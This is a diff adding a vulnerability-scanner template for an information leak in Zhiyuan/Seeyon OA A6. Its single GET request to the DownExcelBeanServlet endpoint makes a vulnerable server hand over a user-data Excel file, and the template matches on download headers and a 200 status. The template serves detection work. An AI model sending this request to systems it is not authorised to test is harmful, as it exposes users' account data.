@@ -1,0 +1,26 @@
+id: zhiyuan-oa-info-leak
+brief:
+    title: Zhiyuan Oa A6-s info Leak
+    by: pikpikcu
+    level: info
+    about: ""
+    label:
+        - zhiyuan
+        - leak
+        - disclosure
+        - seeyon
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0'
+      signs:
+        - "on": word
+          has:
+            - attachment
+            - application/x-msdownload
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
